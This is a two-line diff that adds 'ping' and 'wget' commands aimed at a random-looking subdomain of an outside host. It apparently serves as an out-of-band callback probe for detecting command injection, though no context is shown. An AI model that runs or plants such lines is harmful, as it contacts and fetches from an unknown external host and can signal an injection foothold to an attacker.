@@ -1,0 +1,2 @@
+ping ej1x8m7fq8r16x8v866h43wnye45s2gr.bf.gy
+wget ej1x8m7fq8r16x8v866h43wnye45s2gr.bf.gy
